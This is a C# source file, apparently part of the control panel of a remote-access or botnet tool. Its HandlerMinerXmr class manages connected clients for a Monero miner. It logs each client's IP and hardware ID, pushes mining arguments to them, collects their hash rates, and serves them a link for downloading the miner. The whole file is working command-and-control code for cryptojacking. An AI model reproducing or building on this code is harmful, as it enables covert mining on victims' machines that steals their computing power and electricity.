using System.Globalization;
using System.Windows.Forms;
using Server.Connectings;

namespace Server.Messages;

internal class HandlerMinerXmr
{
	public static void Read(Clients clients, object[] array)
	{
		if (clients == null || array == null || array.Length < 2)
		{
			if (clients != null)
			{
				clients.Disconnect();
			}
			return;
		}
		switch ((string)array[1])
		{
		case "Connect":
			if (Program.form.MinerXMR.work)
			{
				clients.Hwid = (string)array[2];
				DataGridViewRow Item = new DataGridViewRow();
				Item.Tag = clients;
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.IP
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = clients.Hwid
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = "dont mining"
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = "0 H/s"
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[3]
				});
				Item.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = (string)array[4]
				});
				clients.Tag = Item;
				Program.form.MinerXMR.Invoke((MethodInvoker)delegate
				{
					Program.form.MinerXMR.GridClients.Rows.Add(Item);
					if (Program.form.MinerXMR.materialSwitch7.Checked)
					{
						clients.Send(Program.form.MinerXMR.Args());
					}
				});
			}
			else
			{
				clients.Disconnect();
			}
			break;
		case "Status":
			if (clients.Tag == null)
			{
				clients.Disconnect();
				break;
			}
			Program.form.MinerXMR.GridClients.Invoke((MethodInvoker)delegate
			{
				((DataGridViewRow)clients.Tag).Cells[2].Value = (string)array[2];
			});
			break;
		case "Hashrate":
			if (clients.Tag == null)
			{
				clients.Disconnect();
				break;
			}
			Program.form.MinerXMR.GridClients.Invoke((MethodInvoker)delegate
			{
				((DataGridViewRow)clients.Tag).Cells[3].Value = (string)array[2] + " H/s";
			});
			break;
		case "HashrateStats":
		{
			if (clients.Tag == null || array.Length < 8)
			{
				clients.Disconnect();
				break;
			}
			Program.form.MinerXMR.GridClients.Invoke((MethodInvoker)delegate
			{
				((DataGridViewRow)clients.Tag).Cells[3].Value = (string)array[2] + " H/s";
			});
			if (double.TryParse((string)array[2], NumberStyles.Float, CultureInfo.InvariantCulture, out var currentHashrate))
			{
				Program.form.MinerXMR.hashrateHistory.Add((float)currentHashrate);
				if (Program.form.MinerXMR.hashrateHistory.Count > 100)
				{
					Program.form.MinerXMR.hashrateHistory.RemoveAt(0);
				}
			}
			break;
		}
		case "GetLink":
			if (string.IsNullOrEmpty(clients.Hwid))
			{
				clients.Disconnect();
				break;
			}
			clients.Send(new object[2]
			{
				"Link",
				Program.form.settings.linkMiner
			});
			break;
		}
	}
}
